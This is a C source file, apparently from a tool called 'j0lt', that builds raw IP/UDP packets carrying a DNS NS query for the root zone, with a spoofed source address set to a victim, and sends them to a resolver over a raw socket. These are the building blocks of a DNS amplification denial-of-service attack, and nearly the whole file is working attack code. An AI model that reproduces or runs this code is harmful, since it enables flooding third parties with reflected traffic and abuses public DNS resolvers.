#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/nameser.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <ctype.h>
 
#include "io.h"
#include "j0lt.h"
#include "j0lt_network.h"

#define DEFINE_INSERT_FN(typename, datatype)                               \
  bool insert_##typename(uint8_t * *buf, size_t * buflen, datatype data) { \
    uint64_t msb_mask, lsb_mask, bigendian_data, lsb, msb;                 \
    size_t byte_pos, nbits;                                                \
                                                                           \
    if (*buflen < 1) {                                                     \
      return false;                                                        \
    }                                                                      \
                                                                           \
    nbits = sizeof(data) << 3;                                             \
    bigendian_data = 0ULL;                                                 \
    byte_pos = (nbits / 8) - 1;                                            \
    lsb_mask = 0xffULL;                                                    \
    msb_mask = (lsb_mask << nbits) - 8;                                    \
                                                                           \
    byte_pos = byte_pos << 3;                                              \
    for (int i = nbits >> 4; i != 0; i--) {                                \
      lsb = (data & lsb_mask);                                             \
      msb = (data & msb_mask);                                             \
      lsb <<= byte_pos;                                                    \
      msb >>= byte_pos;                                                    \
      bigendian_data |= lsb | msb;                                         \
      msb_mask >>= 8;                                                      \
      lsb_mask <<= 8;                                                      \
      byte_pos -= (2 << 3);                                                \
    }                                                                      \
                                                                           \
    data = bigendian_data == 0 ? data : bigendian_data;                    \
    for (size_t i = sizeof(data); *buflen > 0 && i > 0; i--) {             \
      *(*buf)++ = (data & 0xff);                                           \
      data = (data >> 8);                                                  \
      (*buflen)--;                                                         \
    }                                                                      \
                                                                           \
    return data == 0;                                                      \
  }
DEFINE_INSERT_FN(byte, uint8_t)
DEFINE_INSERT_FN(word, uint16_t)
DEFINE_INSERT_FN(dword, uint32_t)
DEFINE_INSERT_FN(qword, uint64_t)
#undef DEFINE_INSERT_FN

bool is_valid_ip4(const char *str) {
  int i;
  for (i = 0; isdigit(str[i]); i++);
  return str[i] == '.';
}

// [TODO] refactor this ugly ass pos
size_t forge_j0lt_packet(char *payload, uint32_t resolvip, uint32_t spoofip,
                         uint16_t spoofport) {
  const char *url = ".";
  uint8_t pktbuf[NS_PACKETSZ], datagram[NS_PACKETSZ];
  uint8_t *curpos;
  size_t buflen, nwritten, szdatagram, udpsz;
  bool status;

  PSEUDOHDR pseudoheader;

  buflen = NS_PACKETSZ;
  memset(pktbuf, 0, NS_PACKETSZ);

  curpos = pktbuf;
  status = true;
  status &= insert_dns_header(&curpos, &buflen);
  status &=
      insert_dns_question((void **)&curpos, &buflen, url, ns_t_ns, ns_c_in);

  if (status == false) return 0;

  memset(datagram, 0, NS_PACKETSZ);
  curpos = datagram;
  udpsz = NS_PACKETSZ - buflen + sizeof(struct udphdr);
  status &= insert_ip_header(&curpos, &buflen, &pseudoheader, resolvip, spoofip,
                             udpsz);
  status &= insert_udp_header(&curpos, &buflen, &pseudoheader, pktbuf, udpsz,
                              spoofport);
  if (status == false) return 0;

  szdatagram = buflen;
  insert_data((void **)&curpos, &szdatagram, pktbuf, udpsz);
  nwritten = NS_PACKETSZ - buflen;

  memcpy(payload, datagram, nwritten);

  return nwritten;
}

bool insert_dns_header(uint8_t **buf, size_t *buflen) {
  bool status;
  uint8_t third_byte, fourth_byte;

  third_byte = (DNS_RD_J0LT | DNS_TC_J0LT << 1 | DNS_AA_J0LT << 2 |
                DNS_OPCODE_J0LT << 3 | DNS_QR_J0LT << 7);

  fourth_byte = (DNS_RCODE_J0LT | DNS_CD_J0LT << 4 | DNS_AD_J0LT << 5 |
                 DNS_Z_J0LT << 6 | DNS_RA_J0LT << 7);

  status = true;
  status &= insert_word(buf, buflen, DNS_ID_J0LT);

  status &= insert_byte(buf, buflen, third_byte);
  status &= insert_byte(buf, buflen, fourth_byte);

  status &= insert_word(buf, buflen, DNS_QDCOUNT_J0LT);
  status &= insert_word(buf, buflen, DNS_ANCOUNT_J0LT);
  status &= insert_word(buf, buflen, DNS_NSCOUNT_J0LT);
  status &= insert_word(buf, buflen, DNS_ARCOUNT_J0LT);

  return status;
}

bool insert_dns_question(void **buf, size_t *buflen, const char *domain,
                         uint16_t query_type, uint16_t query_class) {
  const char *token;
  char *saveptr, qname[NS_PACKETSZ];
  size_t srclen, domainlen, dif;
  bool status;

  dif = *buflen;
  domainlen = strlen(domain) + 1;
  if (domainlen > NS_PACKETSZ - 1) return false;

  memcpy(qname, domain, domainlen);
  if (qname[0] != '.') {
    token = strtok_r(qname, ".", &saveptr);
    if (token == NULL) return false;
    while (token != NULL) {
      srclen = strlen(token);
      insert_byte((uint8_t **)buf, buflen, srclen);
      insert_data(buf, buflen, token, srclen);
      token = strtok_r(NULL, ".", &saveptr);
    }
  }

  status = true;
  status &= insert_byte((uint8_t **)buf, buflen, 0x00);
  status &= insert_word((uint8_t **)buf, buflen, query_type);
  status &= insert_word((uint8_t **)buf, buflen, query_class);

  dif -= *buflen;
  if (dif % 2 != 0)  // pad
    status &= insert_byte((uint8_t **)buf, buflen, 0x00);

  return status;
}

bool insert_udp_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *phdr,
                       const uint8_t *data, size_t ulen, uint16_t sport) {
  bool status;
  size_t totalsz = sizeof(PSEUDOHDR) + ulen;
  size_t datasz = (ulen - sizeof(struct udphdr));
  size_t udpsofar;
  uint16_t checksum;
  uint8_t pseudo[totalsz];
  uint8_t *pseudoptr = pseudo;

  status = true;
  status &= insert_word(buf, buflen, sport);
  status &= insert_word(buf, buflen, NS_DEFAULTPORT);
  status &= insert_word(buf, buflen, (uint16_t)ulen);
  udpsofar = sizeof(struct udphdr) - 2;

  memset(pseudo, 0, totalsz);
  insert_dword(&pseudoptr, &totalsz, phdr->sourceaddr);
  insert_dword(&pseudoptr, &totalsz, phdr->destaddr);
  insert_byte(&pseudoptr, &totalsz, phdr->zero);
  insert_byte(&pseudoptr, &totalsz, phdr->protocol);
  insert_word(&pseudoptr, &totalsz, sizeof(struct udphdr));

  *buf -= udpsofar;
  insert_data((void **)&pseudoptr, (void *)&totalsz, *buf, udpsofar + 2);
  *buf += udpsofar;
  insert_data((void **)&pseudoptr, (void *)&totalsz, data, datasz);
  checksum = j0lt_checksum((uint16_t *)pseudo, sizeof(PSEUDOHDR) + ulen);
  checksum -= datasz;  // wtf...
  status &= insert_word(buf, buflen, checksum);

  return status;
}

bool insert_ip_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *pheader,
                      uint32_t daddr, uint32_t saddr, size_t ulen) {
  bool status;
  uint8_t *bufptr = *buf;
  uint8_t first_byte;
  uint16_t checksum;

  status = true;
  first_byte = IP_VER_J0LT << 4 | IP_IHL_MIN_J0LT;
  status &= insert_byte(buf, buflen, first_byte);
  status &= insert_byte(buf, buflen, 0x00);  // TOS
  status &=
      insert_word(buf, buflen, (IP_IHL_MIN_J0LT << 2) + ulen);  // total len
  status &= insert_word(buf, buflen, IP_ID_J0LT);
  status &= insert_word(buf, buflen, IP_OF_J0LT);
  status &= insert_byte(buf, buflen, IP_TTL_J0LT);
  status &= insert_byte(buf, buflen, getprotobyname("udp")->p_proto);
  status &= insert_word(buf, buflen, 0x0000);
  status &= insert_dword(buf, buflen, saddr);
  status &= insert_dword(buf, buflen, daddr);

  checksum =
      j0lt_checksum((const uint16_t *)bufptr, (size_t)(IP_IHL_MIN_J0LT << 2));
  *buf -= 0xa;
  *(*buf)++ = (checksum & 0xff00) >> 8;
  **buf = checksum & 0xff;
  *buf += 9;

  memset(pheader, 0, sizeof(PSEUDOHDR));
  pheader->protocol = getprotobyname("udp")->p_proto;
  pheader->destaddr = daddr;
  pheader->sourceaddr = saddr;

  return status;
}

bool send_payload(const uint8_t *datagram, uint32_t daddr, uint16_t uh_dport,
                  size_t nwritten) {
  int raw_sockfd;
  ssize_t nread;
  struct sockaddr_in addr;

  raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (raw_sockfd == -1) err_exit("* fatal socket error run using sudo");

  addr.sin_family = AF_INET;
  addr.sin_port = uh_dport;
  addr.sin_addr.s_addr = daddr;

  nread = sendto(raw_sockfd, datagram, nwritten, 0,
                 (const struct sockaddr *)&addr, sizeof(addr));

  close(raw_sockfd);
  return !(nread == -1 || (size_t)nread != nwritten);
}

uint16_t j0lt_checksum(const uint16_t *addr, size_t count) {
  register uint64_t sum = 0;

  while (count > 1) {
    sum += *(uint16_t *)addr++;
    count -= 2;
  }

  if (count > 0) sum += *(uint8_t *)addr;

  while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);

  return ~((uint16_t)((sum << 8) | (sum >> 8)));
}
